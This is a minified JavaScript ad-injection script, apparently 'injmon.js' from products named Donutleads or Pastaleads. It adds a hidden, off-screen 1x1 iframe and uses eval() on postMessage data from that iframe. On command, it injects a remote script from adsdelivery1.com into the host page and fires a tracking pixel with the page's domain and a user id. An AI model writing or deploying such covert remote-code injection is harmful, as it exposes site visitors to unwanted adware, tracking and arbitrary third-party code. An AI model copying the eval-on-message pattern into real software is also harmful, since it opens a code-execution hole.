(function(){var n={HtmlPath:"npsb/direct/data/mon.html",IsLocal:!1,FullDomain:"",CdnDomain:"",OriginId:"",IsHttps:!1,ProductName:"",UserId:"",ProductName:"",ParamUrl:"",iframe:null,InjectionCollection:[{id:"345776ca-a607-4015-a84c-25cacab08eeb",FuncUrl:function(){return(n.IsHttps?"https://":"http://")+"adsdelivery1.com/ads-api?v=1&key=7169a70f137fe5638022131cbb9c03a9&cp.pubid=116.1"},FuncBefore:null,BlockWithUs:!1}],GetCleanOriginId:function(){for(var t=n.OriginId;t.indexOf("-")>-1;)t=t.replace("-","");return t},GetIframePath:function(){return"//"+n.CdnDomain+"/"+n.HtmlPath+"?"+n.ParamUrl},GetMessageOrigin:function(){return window.location.protocol+"//"+n.CdnDomain},init:function(){n.SetJsParams();n.SetConversion();n.AddIframe()},SetJsParams:function(){for(var e=document.getElementsByTagName("script"),r,i,c,o,f,t,u=0;u<e.length;u++)if(e[u].src.indexOf("/npsb/injmon.js")>-1){r=e[u];break}if(i=r.src.indexOf("?"),i>-1)for(c=r.src.substr(i+1),o=c.split("&"),f=0;f<o.length;f++)(t=o[f].split("="),t.length==2)&&(t[0].toLowerCase()=="originid"&&t[1].length>0?n.OriginId=t[1].toLowerCase():t[0].toLowerCase()=="useruniqueid"?n.UserId=t[1]:t[0].toLowerCase()=="productname"&&(n.ProductName=t[1]),n.ParamUrl+=t[0]+"="+t[1]+"&");if(r){n.IsHttps=window.location.protocol=="https:";n.ParamUrl+="domain="+window.location.host;var i=r.src.indexOf("//")+2,s=r.src.substr(i),h=s.indexOf("/");h==-1&&(h=s.length);n.CdnDomain=s.substr(0,h);i=n.CdnDomain.indexOf(".")+1;n.FullDomain=(n.IsLocal?"":"app.")+n.CdnDomain.substr(i);n.ProductName.length==0&&(n.ProductName=n.CdnDomain.indexOf("donutleads.com")>-1?"Donutleads":"Pastaleads")}},AddIframe:function(){var i=document.getElementsByTagName("body"),t;i.length!=0&&(t=document.createElement("iframe"),t.setAttribute("width","1"),t.setAttribute("height","1"),t.setAttribute("style","display: none; position: absolute; top: -100px; left: -100px;"),t.setAttribute("src",n.GetIframePath()),i[0].appendChild(t),n.iframe=t)},SetConversion:function(){window.addEventListener?window.addEventListener("message",function(t){n.GetMessage(t)},!1):window.attachEvent&&window.attachEvent("onmessage",function(t){n.GetMessage(t)})},GetMessage:function(t){if(t.origin==n.GetMessageOrigin()){var i=eval("("+t.data+")");i.selector=="ToInject"&&typeof i.ToInject=="boolean"&&i.ToInject&&n.Inject()}},Inject:function(){for(var t,r=0;r<n.InjectionCollection.length;r++){if(t=n.InjectionCollection[r],typeof t.FuncUrl!="function")return;typeof t.FuncBefore=="function"&&t.FuncBefore();var f=(n.IsHttps?"https:":"http:")+"//"+n.CdnDomain+"/npsb/Callback/tick.ashx?originid="+n.OriginId+"&injectionid="+t.id,e=t.FuncUrl(),u=document.getElementsByTagName("script")[0],i=document.createElement("script");i.type="text/javascript";i.async=!0;i.src=e;n.GetPixel(i,f);u.parentNode.insertBefore(i,u)}},GetPixel:function(n,t){n.addEventListener?n.addEventListener("load",function(){var n=new Image;n.src=t},!1):n.attachEvent("onload",function(){var n=new Image;n.src=t})}};n.init()})()